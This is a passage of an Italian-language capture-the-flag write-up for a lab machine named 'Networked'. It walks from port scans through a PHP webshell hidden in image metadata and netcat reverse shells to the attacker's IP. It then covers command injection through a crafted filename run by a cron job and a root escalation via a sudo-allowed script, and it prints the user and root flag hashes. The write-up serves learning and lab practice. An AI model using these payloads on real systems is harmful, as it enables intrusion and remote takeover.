@@ -1,0 +1,176 @@
+1) per prima cosa masscan e nmap come al solito, ottengo:
+
+PORT    STATE  SERVICE VERSION
+22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
+|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
+|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
+80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
+|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+443/tcp closed https
+
+2) andando alla pagina web porta 80 c'è solo una scritta:
+
+Hello mate, we're building the new FaceMash!
+Help by funding us and be the new Tyler&Cameron!
+Join us at the pool party this Sat to get a glimpse 
+
+provo a fare scan con dirb:
+	dirb http://10.10.10.146/
+
+                                                                         ==> DIRECTORY: http://10.10.10.146/backup/
++ http://10.10.10.146/cgi-bin/ (CODE:403|SIZE:210)                      
++ http://10.10.10.146/index.php (CODE:200|SIZE:229)                     
+                                                                         ==> DIRECTORY: http://10.10.10.146/uploads/
+                                                                        
+---- Entering directory: http://10.10.10.146/backup/ ----
+                                                                         (!) WARNING: Directory IS LISTABLE. No need to scan it.
+    (Use mode '-w' if you want to scan it anyway)
+                                                                        
+---- Entering directory: http://10.10.10.146/uploads/ ----
+                                                                         + http://10.10.10.146/uploads/index.html (CODE:200|SIZE:2) 
+
+
+
+3) ispezionando il codice di index.php c'è un commento:
+	<!-- upload and gallery not yet linked -->
+
+quindi ci sono altri php non ancora linkati, infatti andando in /backup e scaricando il file che c'è (backup.tar) è possibile ottenere
+il codice php di tutte le pagine:
+	index.php  
+	lib.php  
+	photos.php  
+	upload.php
+
+4) andando in /upload.php posso caricare dei file e dal codice si vede che accetta solo immagini
+dunque inserisco una shell php in un'immagine (file accettati) tramite exiftool:
+
+	exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' black.jpeg
+
+usando questo comando php, posso far eseguire qualunque comando come query (usando ?<comando> dopo la fine del nome dell'immagine)
+cambio nome da black.jpeg a black.php.jpeg
+provo a caricare black.php.jpeg, lo fa caricare correttamente
+
+5) mi metto in ascolto sulla porta 1234 con netcat:
+	netcat -lvnp 1234
+poi vado in 10.10.10.146/photos.php dove ci sono tutte le foto per farlo aggiornare poi in uploads/<nome foto caricata> -> il nome foto caricata è visibile da photos
+a questo punto posso fare:
+	http://10.10.10.146/uploads/10_10_14_252.php.jpeg?cmd=whoami
+e ottengo un risultato, quindi funziona ma viene stampato male quindi voglio ottenere una reverse shell, lo faccio con:
+	http://10.10.10.146/uploads/10_10_14_252.php.jpeg?cmd=nc%20-nv%2010.10.14.252%201234%20-e%20/bin/bash
+nel comando i %20 indicano spazi, comando originale: nc -nv 10.10.14.252 1234 -e /bin/bash
+
+6) una volta entrato vedo che sono utente apache e mi trovo in /var/www/html/uploads.
+vado in /home/guly e trovo:
+	check_attack.php
+	crontab.guly
+	user.txt
+file crontab: https://it.wikipedia.org/wiki/Crontab
+contenuto file crontab.guly: 	*/3 * * * * php /home/guly/check_attack.php
+
+Lo script php invece è il seguente:
+
+<?php
+require '/var/www/html/lib.php';
+$path = '/var/www/html/uploads/';
+$logpath = '/tmp/attack.log';
+$to = 'guly';
+$msg= '';
+$headers = "X-Mailer: check_attack.php\r\n";
+
+$files = array();
+$files = preg_grep('/^([^.])/', scandir($path));
+
+foreach ($files as $key => $value) {
+	$msg='';
+  if ($value == 'index.html') {
+	continue;
+  }
+  #echo "-------------\n";
+
+  #print "check: $value\n";
+  list ($name,$ext) = getnameCheck($value);
+  $check = check_ip($name,$value);
+
+  if (!($check[0])) {
+    echo "attack!\n";
+    # todo: attach file
+    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);
+
+    exec("rm -f $logpath");
+    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
+    echo "rm -f $path$value\n";
+    mail($to, $msg, $msg, $headers, "-F$value");
+  }
+}
+
+?>
+
+come si può vedere la variabile $value è il nome di tutte le immagini nella cartella /var/www/html/uploads/, 
+se si riesce a farle assumere un valore adatto è possibile eseguire un comando, perchè l'eliminazione del file avviene tramite exec.
+Per farlo dobbiamo quindi creare un file con un valore tale da essere un comando, e in particolare una reverse shell,
+per concatenarlo al resto del comando lo faccio iniziare con ;.
+per creare il file uso il comando touch (https://www.geeksforgeeks.org/touch-command-in-linux-with-examples/):
+	
+	touch ";nc -e  bash 10.10.14.119 5556" 
+
+(ovviamente prima mi sono messo in ascolto con netcat -lvnp 5556     ---->    non funziona quindi mi metto in ascolto con      nc -lvnp 5556     e funziona)
+in questo caso ho usato un comando leggermente diverso per creare la reverse shell con netcat perchè gli / del comando "originale" non andavano bene.
+Ora teoricamente lo script viene avviato ogni tre minuti quindi si deve aspettare.
+
+
+7) ora ho una shell con guly e infatti posso ottenre il flag di user:
+	526cfc2305f17faaacecf212c57d71c5
+
+8)usando sudo -l ottengo:
+
+Matching Defaults entries for guly on networked:
+    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+User guly may run the following commands on networked:
+    (root) NOPASSWD: /usr/local/sbin/changename.sh
+
+
+vediamo che guly può eseguire /usr/local/sbin/changename.sh senza dover inserire la password, controllo cos'è:
+
+#!/bin/bash -p
+cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
+DEVICE=guly0
+ONBOOT=no
+NM_CONTROLLED=no
+EoF
+
+regexp="^[a-zA-Z0-9_\ /-]+$"
+
+for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
+	echo "interface $var:"
+	read x
+	while [[ ! $x =~ $regexp ]]; do
+		echo "wrong input, try again"
+		echo "interface $var:"
+		read x
+	done
+	echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
+done
+  
+/sbin/ifup guly0
+
+alla fine dello script c'è:
+	echo $var=$x
+visto che $x non ci sono le virgolette, possiamo inserire qualsiasi comando (anche perchè la regex non blocca i comandi ma solo se non scrivi nulla)
+possiamo quindi eseguire bash /bin/sh per ottenere una shell di root 	->	la ottengo di root perchè eseguo lo script con sudo:
+	sudo /usr/local/sbin/changename.sh
+infatti "rispondendo" con bash /bin/sh a tutte le "domande", alla fine ottengo la shell di root (non mi viene stampato nulla ma facendo id pttengo che sono root)
+a questo punto posso prendere facilmente il flag di root:
+	0a8ecda83f1d81251099e8ac3d0dcb82
+
+
+
+
+
+
+
+
+
